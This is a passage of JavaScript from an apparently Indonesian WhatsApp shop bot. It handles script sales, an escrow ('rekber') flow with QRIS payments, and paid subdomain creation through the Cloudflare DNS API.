const filePath = path.join(scriptFolder, fileName);

if (!fs.existsSync(scriptFolder)) {
fs.mkdirSync(scriptFolder, { recursive: true });
}
fs.writeFileSync(filePath, media);
let scriptsData = { scripts: [] };
try {
scriptsData = JSON.parse(fs.readFileSync(scriptPath, 'utf-8'));
} catch (parseError) {
console.warn('Could not parse existing scripts database, creating new one');
}
scriptsData.scripts.push({
name: name,
price: parseInt(price),
description: description,
filePath: filePath,
timestamp: Date.now()
});
fs.writeFileSync(scriptPath, JSON.stringify(scriptsData, null, 2));
m.reply(`✅ *Script berhasil ditambahkan!*\n📜 *Nama*: ${name}\n💰 *Harga*: Rp ${parseInt(price).toLocaleString()}\n📝 *Deskripsi*: ${description}`);
} catch (error) {
console.error('Download Error:', error);
m.reply(`❌ *Gagal menambahkan script: ${error.message}*`);
}
break;
}

case 'beliscript': {
    const scriptPath = './source/database/scripts.json';
    const userSaldo = cekSaldo(m.sender) || 0;

    const scriptName = args.join(" ");
    if (!scriptName) return m.reply("❌ *Format salah!*\n📌 Contoh: .beliscript NamaScript");

    // Baca database
    const scriptsData = JSON.parse(fs.readFileSync(scriptPath, 'utf-8'));
    const script = scriptsData.scripts.find(s => s.name.toLowerCase() === scriptName.toLowerCase());

// Validasi script
if (!script) return m.reply(`❌ *Script "${scriptName}" tidak ditemukan!`);

// Jika saldo mencukupi, langsung proses pembelian
if (userSaldo >= script.price) {
    kurangiSaldo(m.sender, script.price);
    await gisnaxd.sendMessage(m.chat, {
        document: fs.readFileSync(script.filePath),
        mimetype: 'application/zip',
        fileName: `${script.name}.zip`,
        caption: `✅ *Berhasil membeli script!*\n📜 *Nama*: ${script.name}\n📝 *Deskripsi*: ${script.description}\n💰 *Harga*: Rp ${script.price.toLocaleString()}`
    });
    
    break;
} else {
    // Jika saldo tidak cukup, minta pembayaran via Orkut
    const pay = await (
        await fetch(`${global.webapi}/api/orkut/createpayment?amount=${script.price}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`)
    ).json();
    const expirationTime = new Date(pay.result.expirationTime);

    const teks3 = `
📄 *INFO PEMBAYARAN SCRIPT*

💰 *Total Pembayaran*: Rp ${await toIDR(pay.result.amount)}
📜 *Script*: ${script.name}
🕒 *Expired*: 5 menit

📌 *Catatan*: 
1️⃣ QRIS hanya berlaku dalam 5 menit.
2️⃣ Jika pembayaran berhasil, bot akan otomatis mengirimkan script.

🛑 Jika ingin membatalkan, ketik *${prefix}batalbeli*.
`;

    let msgQr = await gisnaxd.sendMessage(m.chat, { image: { url: pay.result.qrImageUrl }, caption: teks3 }, { quoted: m });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].orkut = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: pay.result.transactionId,
        amount: pay.result.amount.toString(),
        exp: setTimeout(async () => {
            if (db.users[m.sender].status_deposit && db.users[m.sender].orkut) {
                await gisnaxd.sendMessage(db.users[m.sender].orkut.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].orkut.msg });
                await gisnaxd.sendMessage(db.users[m.sender].orkut.chat, { delete: db.users[m.sender].orkut.msg.key });
                db.users[m.sender].status_deposit = false;
                delete db.users[m.sender].orkut;
            }
        }, 300000), // 5 menit
    };

    // Cek status pembayaran
    while (db.users[m.sender].status_deposit && db.users[m.sender].orkut) {
        await sleep(8000);
        const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`);
        const req = resultcek.data;

        if (db.users[m.sender].orkut && req?.amount == db.users[m.sender].orkut.amount) {
            db.users[m.sender].status_deposit = false;
            clearTimeout(db.users[m.sender].orkut.exp);
            let transaksiSukses = {
              id: db.users[m.sender].saweria.idDeposit,
              user: m.sender,
              amount: db.users[m.sender].saweria.amount,
              method: "QRIS"
          };
      
          await sendPaymentNotificationToOwner(transaksiSukses);
            
            await gisnaxd.sendMessage(m.chat, {
                document: fs.readFileSync(script.filePath),
                mimetype: 'application/zip',
                fileName: `${script.name}.zip`,
                caption: `✅ *Berhasil membeli script!*\n📜 *Nama*: ${script.name}\n📝 *Deskripsi*: ${script.description}\n💰 *Harga*: Rp ${script.price.toLocaleString()}`
            });
            break;
        }
    }
}
break;
}

case 'infoscript': {
const scriptPath = './source/database/scripts.json';

// Validasi argumen
if (!args[0] || isNaN(args[0])) {
return m.reply("❌ *Berikan nomor script yang valid!*\n_Contoh: .infoscript 1_");
}

const scriptIndex = parseInt(args[0]) - 1;

try {
// Baca database script
let scriptsData = JSON.parse(fs.readFileSync(scriptPath, 'utf-8'));

// Validasi index script
if (scriptIndex < 0 || scriptIndex >= scriptsData.scripts.length) {
return m.reply("❌ *Nomor script tidak valid!*");
}

// Ambil script yang dipilih
const script = scriptsData.scripts[scriptIndex];

// Buat pesan detail
let detailMessage = "*📜 DETAIL SCRIPT 📜*\n\n";
detailMessage += `*Nama Script*: ${script.name}\n`;
detailMessage += `*Harga*: Rp ${script.price.toLocaleString()}\n`;
detailMessage += `*Deskripsi*: ${script.description}\n`;
detailMessage += `*Ditambahkan*: ${new Date(script.timestamp).toLocaleDateString()}\n\n`;
detailMessage += "_Hubungi admin untuk pembelian_";

// Kirim detail
m.reply(detailMessage);

} catch (error) {
console.error('Info Script Error:', error);
m.reply("❌ *Gagal menampilkan detail script.*");
}
break;
}
case 'delscript': {
if (!isCreator) return m.reply(mess.owner);
const scriptPath = './source/database/scripts.json';
const scriptFolder = './source/scripts/';

// Cek apakah nomor script disediakan
if (!args[0] || isNaN(args[0])) {
return m.reply("❌ *Berikan nomor script yang valid!*\n_Contoh: .delscript 1_");
}

const scriptIndex = parseInt(args[0]) - 1;

try {
// Baca database scripts
let scriptsData = JSON.parse(fs.readFileSync(scriptPath, 'utf-8'));

// Validasi index script
if (scriptIndex < 0 || scriptIndex >= scriptsData.scripts.length) {
return m.reply("❌ *Nomor script tidak valid!*");
}

// Ambil detail script yang akan dihapus
const scriptToDelete = scriptsData.scripts[scriptIndex];

// Hapus file script dari folder
try {
const filePath = path.join(scriptFolder, path.basename(scriptToDelete.filePath));
if (fs.existsSync(filePath)) {
fs.unlinkSync(filePath);
}
} catch (fileDeleteError) {
console.error('Error menghapus file:', fileDeleteError);
}

// Hapus script dari database
scriptsData.scripts.splice(scriptIndex, 1);

// Simpan perubahan ke database
fs.writeFileSync(scriptPath, JSON.stringify(scriptsData, null, 2));

// Kirim konfirmasi
m.reply(`✅ *Script berhasil dihapus!*\n📜 Nama: ${scriptToDelete.name}\n💰 Harga: Rp ${scriptToDelete.price.toLocaleString()}`);

} catch (error) {
console.error('Delete Script Error:', error);
m.reply("❌ *Gagal menghapus script.*");
}
break;
}
case 'listscript': {
  const scriptPath = './source/database/scripts.json';
  const scriptFolder = './source/scripts/';
  try {
      let scriptsData = { scripts: [] };

      try {
          scriptsData = JSON.parse(fs.readFileSync(scriptPath, 'utf-8'));
      } catch (parseError) {
          return m.reply("❌ *Belum ada script yang tersimpan.*");
      }

      if (!scriptsData.scripts || scriptsData.scripts.length === 0) {
          return m.reply("❌ *Tidak ada script yang tersedia.*");
      }

      const formatFileSize = (bytes) => {
          if (bytes < 1024) return `${bytes} B`;
          if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(2)} KB`;
          return `${(bytes / (1024 * 1024)).toFixed(2)} MB`;
      };

      let title = `
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┃               📥 *LIST SEMUA SCRIPT BOTSHOP* 📥
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

📄 *Informasi Produk*
🤸 *Bot Auto Response 24 Jam*  
🏛 *Produk Asli & Terpercaya*  
💳 *Pembayaran Mudah: QRIS / Saldo*  

🔍 *Pilih script yang sesuai kebutuhan Anda!*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

      // Menyiapkan data script
      const scriptRows = scriptsData.scripts.map((script, index) => {
          let fileSize = "Tidak tersedia";
          try {
              const filePath = path.join(scriptFolder, path.basename(script.filePath));
              const size = fs.statSync(filePath).size;
              fileSize = formatFileSize(size);
          } catch (sizeError) {
              console.error('File size error:', sizeError);
          }

          return {
              title: `${index + 1}. ${script.name}`,
              description: `📂 *Harga*: Rp ${script.price.toLocaleString("id-ID")}\n📦 *Ukuran*: ${fileSize}`,
              id: `.beliscript ${script.name}`
          };
      });

      const buttonData = {
          title: "📥 *Daftar List Script Qoupay Shop*",
          sections: [{
              title: "📜 *Daftar Script*",
              rows: scriptRows
          }]
      };

      const footer = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✨ * [ ! ] BOTSHOP V4 🚴*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

      // Menggunakan function sendList
      await gisnaxd.sendList(m.chat, title, footer, buttonData, { quoted: m });

  } catch (error) {
      console.error('List Script Error:', error);
      m.reply("❌ *Gagal menampilkan daftar script.*");
  }
  break;
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//FITUR-REKBER
case "rekber": {
    if (!text.includes("|")) return m.reply("Format salah! Gunakan: .rekber <nomor_pembeli>|<nomor_penjual>|<nama_grup>");

    let [nomorPembeli, nomorPenjual, namaGrup] = text.split("|").map(n => n.trim());

    if (!nomorPembeli || !nomorPenjual || !namaGrup) 
        return m.reply("Format salah! Gunakan: .rekber <nomor_pembeli>|<nomor_penjual>|<nama_grup>");

    // Pastikan nomor dalam format yang benar
    nomorPembeli = nomorPembeli.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    nomorPenjual = nomorPenjual.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const mcGroupsPath = "./library/mc_groups.json";

    // Pastikan mcGroups selalu dalam bentuk array
    let mcGroups = [];
    if (fs.existsSync(mcGroupsPath)) {
        try {
            let fileData = fs.readFileSync(mcGroupsPath, "utf8");
            mcGroups = JSON.parse(fileData);
            if (!Array.isArray(mcGroups)) mcGroups = [];
        } catch (error) {
            console.error("Error parsing mc_groups.json:", error);
            mcGroups = [];
        }
    }

    try {
        // Cek apakah grup sudah ada untuk seller ini
        let existingGroup = mcGroups.find(g => g.seller === nomorPenjual);
        if (existingGroup) return m.reply(`Grup sudah ada: ${existingGroup.groupName}`);

        // Buat grup baru
        let createGroup = await gisnaxd.groupCreate(namaGrup, [nomorPembeli, nomorPenjual]);
        let groupId = createGroup.id;

        // Simpan ke mc_groups.json
        mcGroups.push({
            groupId,
            seller: nomorPenjual,
            buyer: nomorPembeli,
            groupName: namaGrup
        });
        fs.writeFileSync(mcGroupsPath, JSON.stringify(mcGroups, null, 2));

        // Kirim pesan ke grup
        let pesanGrup = `📌 *Nama Grup:* ${namaGrup}\n👤 *Pembeli:* @${nomorPembeli.split("@")[0]}\n🛒 *Penjual:* @${nomorPenjual.split("@")[0]}\n\n━━━━━━━━━━━━━━━━━━━

📢 Tata Cara Rekber di Bot WhatsApp
━━━━━━━━━━━━━━━━━━━

1️⃣ Penjual Membuat Transaksi 🛒
📌 Penjual mengirim perintah untuk jual akun:
Contoh : .reqrekber Harga | nopenjual

2️⃣ Pembeli Melakukan Pembayaran 💰
📌 Bot mengirim QRIS pembayaran.
📌 Pembeli harus bayar sesuai nominal.

3️⃣ Konfirmasi Pembayaran ✅
📌 Setelah pembayaran sukses, bot memberi tahu penjual.

4️⃣ Bot Mengirim Akun 🔍
📌 Setelah akun terkirim, cek dan pastikan bisa login.

5️⃣ Konfirmasi Akun & Dana 🔐
📌 Jika akun aman, ketik:
donerekber <id_trx>
📌 Setelah itu, saldo otomatis dikirim ke penjual.

6️⃣ Selesaikan Rekber 🔐
📌 Jika transaksi sudah selesai, penjual harus mengetik:
donerekber
📌 Ini akan menutup transaksi secara resmi di sistem dan memastikan dana diproses sesuai kesepakatan.

━━━━━━━━━━━━━━━━━━━
⚠️ Jika ada masalah, hubungi admin untuk penyelesaian lebih lanjut.
━━━━━━━━━━━━━━━━━━━`;

        await gisnaxd.sendMessage(groupId, { text: pesanGrup, mentions: [nomorPembeli, nomorPenjual] });

        // Konfirmasi ke chat pribadi
        m.reply(`✅ Grup berhasil dibuat: ${namaGrup}\n📌 ID Grup: ${groupId}`);

    } catch (error) {
        console.error("Error creating group:", error);
        m.reply("❌ Gagal membuat grup. Pastikan nomor valid dan bot memiliki izin.");
    }
    break;
}

case "reqrekber": {
  const fs = require("fs");
  const axios = require("axios");

  if (!text.includes("|")) return m.reply("Format salah! Gunakan:\n.rekber harga|noPenjual");

  let [harga, nomorPenjual] = text.split("|").map(n => n.trim());
  if (!harga || !nomorPenjual) return reply("❌ Format salah! Pastikan semua data terisi.");
  if (isNaN(harga) || isNaN(nomorPenjual)) return reply("❌ Harga dan nomor penjual harus berupa angka!");

  const rekberPath = "./library/rekber.json";
  const mcGroupsPath = "./library/mc_groups.json";
  
  let seller = m.sender;
  let hargaNum = parseInt(harga);

  // Hitung fee admin
  let feeAdmin = hargaNum <= 1000 ? 500 : hargaNum * 0.05; // 5% fee admin
  const totalAmount = hargaNum + feeAdmin;

  // Cek grup transaksi
  if (!fs.existsSync(mcGroupsPath)) return m.reply("❌ Grup transaksi tidak ditemukan!");
  let mcGroups = JSON.parse(fs.readFileSync(mcGroupsPath, "utf8"));
  let mcGroup = mcGroups.find(g => g.seller === seller);
  if (!mcGroup) return m.reply("❌ Grup transaksi tidak ditemukan!");

  let groupId = mcGroup.groupId;
  let buyer = mcGroup.buyer;

  // Generate kode unik
  const tambahanUnik = Math.floor(Math.random() * 2000) + 1;
  const finalAmount = totalAmount + tambahanUnik;

  // Panggil API QRIS
  const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${finalAmount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`);

  const teks3 = `
*乂 INFORMASI PEMBAYARAN REKBER*

*ァ ID :* ${get.data.result.transactionId}
*ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*ァ Barang :* Jasa Rekber
*ァ Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika tidak dibayar dalam waktu tersebut, transaksi akan dibatalkan otomatis.

Ketik *.batalrekber* untuk membatalkan.
`;

  let msgQr = await gisnaxd.sendMessage(groupId, {
      footer: ` ${botname}`,
      buttons: [
          {
              buttonId: ".batalrekber",
              buttonText: { displayText: "Batalkan Rekber" },
              type: 1
          }
      ],
      headerType: 1,
      viewOnce: true,
      image: { url: get.data.result.qrImageUrl },
      caption: teks3
  });

  let rekberData = fs.existsSync(rekberPath) ? JSON.parse(fs.readFileSync(rekberPath, "utf8")) : [];
  rekberData.push({
      seller,
      buyer,
      harga: hargaNum,
      fee: feeAdmin,
      total: finalAmount,
      status: "pending",
      transactionId: get.data.result.transactionId
  });
  fs.writeFileSync(rekberPath, JSON.stringify(rekberData, null, 2));

  // Timeout untuk pembayaran
  setTimeout(async () => {
      let updatedRekberData = JSON.parse(fs.readFileSync(rekberPath, "utf8"));
      let transaksi = updatedRekberData.find(t => t.transactionId === get.data.result.transactionId);
      
      if (transaksi && transaksi.status === "pending") {
          transaksi.status = "canceled";
          fs.writeFileSync(rekberPath, JSON.stringify(updatedRekberData, null, 2));
          await gisnaxd.sendMessage(groupId, { text: "❌ Waktu pembayaran habis. Transaksi dibatalkan!" });
      }
  }, 300000);

  // Loop pengecekan pembayaran
  while (rekberData.find(t => t.transactionId === get.data.result.transactionId)?.status === "pending") {
      await sleep(8000);
      const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`);
      const req = await resultcek.data;

      if (req?.amount == finalAmount) {
          let transaksi = rekberData.find(t => t.transactionId === get.data.result.transactionId);
          if (transaksi) {
              transaksi.status = "success";
              fs.writeFileSync(rekberPath, JSON.stringify(rekberData, null, 2));

              await gisnaxd.sendMessage(groupId, { text: `
✅ *Pembayaran Berhasil!* 
💰 Dana telah diterima dan ditahan oleh sistem Rekber sementara.

📌 *Cara Konfirmasi Rekber:*
1️⃣ Seller mengirim barang/jasa kepada pembeli.
2️⃣ Pembeli memeriksa dan memastikan barang/jasa sudah sesuai.
3️⃣ Setelah validasi, pembeli ketik *.donerekber ${transaksi.transactionId}* untuk menyelesaikan transaksi.

⚠️ *Peringatan:* Pastikan semua sudah sesuai sebelum melakukan konfirmasi, karena dana akan langsung diteruskan ke penjual setelah konfirmasi!
              `});
          }
      }
  }
  break;
}

case "batal": {
    const fs = require("fs");

    const rekberPath = "./library/rekber.json";
    let rekberData = fs.existsSync(rekberPath) ? JSON.parse(fs.readFileSync(rekberPath, "utf8")) : [];

    // Periksa apakah ada transaksi rekber yang masih pending untuk user ini
    let transaksi = rekberData.find(t => t.seller === m.sender && t.status === "pending");

    if (!transaksi) return m.reply("❌ Tidak ada transaksi Rekber yang sedang berlangsung!");

    let groupId = transaksi.groupId;

    // Mengirim pesan bahwa transaksi dibatalkan
    await gisnaxd.sendMessage(groupId, { text: "⛔ Transaksi dibatalkan oleh penjual!" });

    // Hapus pesan QRIS yang sebelumnya dikirim
    if (transaksi.msg && transaksi.msg.key) {
        try {
            await gisnaxd.sendMessage(groupId, { delete: transaksi.msg.key });
        } catch (err) {
            console.error("❌ Gagal menghapus pesan QRIS:", err);
        }
    }

    // Hapus data transaksi dari rekber.json
    rekberData = rekberData.filter(t => t.refID !== transaksi.refID);
    fs.writeFileSync(rekberPath, JSON.stringify(rekberData, null, 2));

    reply("✅ Transaksi berhasil dibatalkan!");
    break;
}

case "donerekber": {
    const fs = require("fs");
    const { tambahSaldo } = require("./library/cekdatasaldo");
    
    const rekberPath = "./library/rekber.json";
    const mcGroupsPath = "./librarymc_groups.json";

    if (!fs.existsSync(mcGroupsPath) || !fs.existsSync(rekberPath)) {
        return m.reply("❌ Data transaksi tidak ditemukan!");
    }

    let mcGroups = JSON.parse(fs.readFileSync(mcGroupsPath, "utf8"));
    let rekberData = JSON.parse(fs.readFileSync(rekberPath, "utf8"));
    
    let user = m.sender;
    let mcGroup = mcGroups.find(g => g.seller === user || g.buyer === user);
    if (!mcGroup) return m.reply("❌ Grup transaksi tidak ditemukan!");

    let groupId = mcGroup.groupId;
    let transaksi = rekberData.find(t => t.groupId === groupId);
    if (!transaksi) return m.reply("❌ Transaksi tidak ditemukan!");

    if (!transaksi.konfirmasi) transaksi.konfirmasi = [];
    if (!transaksi.konfirmasi.includes(user)) transaksi.konfirmasi.push(user);

    if (transaksi.konfirmasi.includes(transaksi.seller) && transaksi.konfirmasi.includes(transaksi.buyer)) {
        // Jika kedua pihak sudah konfirmasi, saldo masuk ke penjual
        tambahSaldo(transaksi.seller, transaksi.harga);
        m.reply("✅ Dana telah masuk ke penjual!");

        // Hapus data transaksi dari rekber.json
        rekberData = rekberData.filter(t => t.groupId !== groupId);
        fs.writeFileSync(rekberPath, JSON.stringify(rekberData, null, 2));

        // Hapus grup dari mc_groups.json
        mcGroups = mcGroups.filter(g => g.groupId !== groupId);
        fs.writeFileSync(mcGroupsPath, JSON.stringify(mcGroups, null, 2));

        // Kick semua anggota kecuali bot
        let groupMetadata = await gisnaxd.groupMetadata(groupId);
        let botNumber = gisnaxd.user.id.split(":")[0] + "@s.whatsapp.net";

        for (let participant of groupMetadata.participants) {
            if (participant.id !== botNumber) {
                await gisnaxd.groupParticipantsUpdate(groupId, [participant.id], "remove");
            }
        }

        // Hapus grup jika bot adalah admin
        let botAdmin = groupMetadata.participants.find(p => p.id === botNumber && p.admin);
        if (botAdmin) {
            await gisnaxd.groupLeave(groupId);
        }

        m.reply("✅ Transaksi selesai dan grup telah dihapus!");
    } else {
        m.reply("✅ Konfirmasi diterima! Menunggu pihak lain untuk menyelesaikan transaksi.");
    }

    break;
}


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//SET-MONITORING
case "listrekber": {
    if (!isOwner) return m.reply("⚠️ Perintah ini hanya bisa digunakan oleh owner.");

    const fs = require("fs");
    const rekberPath = "./all/database/rekber.json";

    // Cek apakah file rekber.json ada
    if (!fs.existsSync(rekberPath)) return m.reply("📌 Tidak ada transaksi rekber yang tersedia.");

    let rekberData = JSON.parse(fs.readFileSync(rekberPath, "utf8"));

    // Pastikan data dalam rekber.json adalah array
    if (!Array.isArray(rekberData) || rekberData.length === 0) {
        return m.reply("📌 Tidak ada transaksi rekber yang aktif.");
    }

    let rekberList = "📜 *Daftar Rekber Aktif:*\n\n";
    rekberData.forEach((rekber, index) => {
        rekberList += `🔹 *Transaksi ${index + 1}*\n`;
        rekberList += `📌 *ID:* ${rekber.refID}\n`;
        rekberList += `👤 *Seller:* ${rekber.seller}\n`;
        rekberList += `👤 *Buyer:* ${rekber.buyer}\n`;
        rekberList += `💰 *Harga Asli:* Rp${rekber.harga.toLocaleString("id-ID")}\n`;
        rekberList += `🧾 *Fee Admin:* Rp${rekber.feeAdmin.toLocaleString("id-ID")}\n`;
        rekberList += `💸 *Total Bayar:* Rp${rekber.totalBayar.toLocaleString("id-ID")}\n`;
        rekberList += `📢 *Nomor Penjual:* ${rekber.nomorPenjual}\n`;
        rekberList += `🟢 *Status:* ${rekber.status === "pending" ? "Menunggu Pembayaran" : rekber.status === "paid" ? "Sudah Dibayar" : "Dibatalkan"}\n`;
        rekberList += `🔗 *Grup Transaksi:* https://chat.whatsapp.com/${rekber.groupId}\n`;
        rekberList += `────────────────────\n`;
    });

    m.reply(rekberList);
    break;
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//AUTO-AI
// Contoh penggunaan
case "autoai": {
        if (!text) return m.reply(`*Contoh:* .autoai *[on/off/reset]*`);

        if (text === "on") {
            sessions[m.sender] = { messages: [] };
            saveSession();
            return m.reply(`[ ✅ ] *Auto AI diaktifkan!* Sekarang bot akan merespon chat secara otomatis.`);
        } else if (text === "off") {
            delete sessions[m.sender];
            saveSession();
            return m.reply(`[ ❌ ] *Auto AI dimatikan!* Sekarang bot hanya merespon jika dipanggil.`);
        } else if (text === "reset") {
            if (!sessions[m.sender]) return m.reply("⚠️ *Tidak ada sesi yang perlu direset!*");
            delete sessions[m.sender];
            saveSession();
            return m.reply("♻️ *Riwayat chat AI telah direset!*");
        }
    }
    break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//MODE-GAMES
/*
Menu Games Di Ganti Sama Menu Rpg Yang Lebih Simpel,
Dan Untuk Saldi Rpg Sudah Bisa Tarik ke Saldo Bot , Untuk Menarik nya Bisa ketik
.tarik , Semoga Ada Update Selanjut nya ya !!
*/
//====================Buy-Domain
case "buydomain":{
let t = text.split(',');
 if (t.length < 2) return Reply(`*Format salah!*\nPenggunaan:\n${prefix + command} hostname, ipVps`);
 let hostname = t[0].trim(); 
 let ip = t[1].trim(); 
 let teksnya = `
Haii @${m.sender.split("@")[0]}, Silahkan Pilih Layanan Yang Tersedia Di Bawah
 `;
 let thumbnailBuffer;
 try {
 const response = await axios.get(global.image.small_menu, { responseType: "arraybuffer" }); 
 thumbnailBuffer = response.data;
 } catch (err) {
 console.error("Gagal mengambil gambar:", err);
 }

 await gisnaxd.sendMessage(m.chat, {
 footer: ` ${botname}`,
buttons: [{
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Domain Tersedia',
          sections: [
            {
              title: 'LAYANAN',
              highlight_label: 'HOT♨️',
              rows: [
      { title: `${global.domain1}`, description: "aktif", id: `.domain1 ${hostname}|${ip}` },
 { title: `${global.domain2}`, description: "aktif", id: `.domain2 ${hostname}|${ip}` },
 { title: `${global.domain3}`, description: "aktif", id: `.domain3 ${hostname}|${ip}` },
 { title: `${global.domain4}`, description: "aktif", id: `.domain4 ${hostname}|${ip}` },
 { title: `${global.domain5}`, description: "aktof", id: `.domain5 ${hostname}|${ip}` }
              ]
            }
          ]
        })
      }
      }
  ],
 headerType: 1,
 viewOnce: true,
 document: fs.readFileSync("./Mydev.txt"),
 fileName: `By ${namaOwner} </>`,
 mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
 fileLength: 99999999,
 caption: teksnya,
 contextInfo: {
 isForwarded: true,
 mentionedJid: [m.sender],
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idSaluran,
 newsletterName: global.namaSaluran
 },
 externalAdReply: {
 title: `${botname}`,
 body: `🚴💨 ${runtime(process.uptime())}`,
 mediaType: 1,
 thumbnailUrl: global.image.small_menu, 
 sourceUrl: linkSaluran,
 renderLargerThumbnail: false 
 }
 }
 });
}
break;

case 'domain1':
{
    if (m.isGroup) return Reply("Buy Domain hanya dapat dilakukan melalui private chat.");
    if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    function subDomain1(hostname, ip) {
        return new Promise((resolve) => {
            let zone = global.zona1;
            let apitoken = global.apitoken1;
            let tld = global.domain1;

            axios
                .post(
                    `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                    {
                        type: "A",
                        name: hostname + "." + tld,
                        content: ip,
                        ttl: 3600,
                        priority: 10,
                        proxied: false,
                    },
                    {
                        headers: {
                            Authorization: "Bearer " + apitoken,
                            "Content-Type": "application/json",
                        },
                    }
                )
                .then((response) => {
                    let res = response.data;
                    if (res.success) {
                        resolve({
                            success: true,
                            zone: res.result?.zone_name,
                            name: res.result?.name,
                            ip: res.result?.content,
                        });
                    } else {
                        resolve({ success: false, error: "Unknown error occurred" });
                    }
                })
                .catch((error) => {
                    let err1 =
                        error.response?.data?.errors?.[0]?.message ||
                        error.response?.data?.errors ||
                        error.response?.data ||
                        error.response ||
                        error.message;
                    resolve({ success: false, error: String(err1) });
                });
        });
    }

    let raw1 = args?.join(" ")?.trim();
    if (!raw1) return Reply("Mana host & IP-nya?");
    let host0 = raw1
        .split("|")[0]
        .trim()
        .replace(/[^a-z0-9.-]/gi, "");
    if (!host0) return Reply("Host tidak valid, pastikan hanya mengandung huruf, angka, - (strip), dan . (titik)");
    let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
    if (!ip1 || ip1.split(".").length !== 4 || ip1.split(".").some((seg) => isNaN(seg) || seg < 0 || seg > 255)) {
        return Reply(ip1 ? "IP tidak valid" : "Mana IP-nya?");
    }

    const amount = 1000;

    try {
        const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`)
        const teks3 = `
        *乂 INFORMASI PEMBAYARAN*
        
        *ァ ID :* ${get.data.result.transactionId}
        *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
        *ァ Barang :* Subdomain
        *ァ Expired :* 5 menit
        
        *Note :* 
        Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
        Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
        
        Ketik *.batalbeli* untuk membatalkan
        `
        let msgQr = await gisnaxd.sendMessage(m.chat, {
        footer: ` ${botname}`,
        buttons: [
            {
            buttonId: `.batalbeli`,
            buttonText: { displayText: 'Batalkan Pembelian' },
            type: 1
            }
        ],
        headerType: 1,
        viewOnce: true,
        image: {url: get.data.result.qrImageUrl}, 
        caption: teks3,
        contextInfo: {
        mentionedJid: [m.sender]
        },
        })
        db.users[m.sender].status_deposit = true
        db.users[m.sender].saweria = {
        msg: msgQr, 
        chat: m.sender,
        idDeposit: get.data.result.transactionId, 
        amount: get.data.result.amount.toString(), 
        exp: function () {
        setTimeout(async () => {
        if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
        await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
        await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
        db.users[m.sender].status_deposit = false
        await clearInterval(db.users[m.sender].saweria.exp)
        delete db.users[m.sender].saweria
        }
        }, 300000)
        }
        }
        
        await db.users[m.sender].saweria.exp()
        
        while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
        await sleep(8000)
        const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`)
        const req = await resultcek.data
        if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
        db.users[m.sender].status_deposit = false
        await clearInterval(db.users[m.sender].saweria.exp)
        let transaksiSukses = {
          id: db.users[m.sender].saweria.idDeposit,
          user: m.sender,
          amount: db.users[m.sender].saweria.amount,
          method: "QRIS"
      };
  
      await sendPaymentNotificationToOwner(transaksiSukses);
        
        await subDomain1(host0, ip1).then((result) => {
            if (result.success) {
                Reply(`✅ *Subdomain berhasil dibuat!*\n\n🌐 *Domain:* ${result.name}\n🖥️ *IP:* ${result.ip}\n\nTerima kasih telah menggunakan layanan kami!`);
            } else {
                Reply(`❌ Gagal membuat subdomain\n📌 *Pesan:* ${result.error}`);
            }
        });
        }
        }
    } catch (error) {
        console.error('Error:', error);
        Reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
    }
    break;
}


case 'domain1':
{
    if (m.isGroup) return Reply("Buy Domain hanya dapat dilakukan melalui private chat.");
    if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

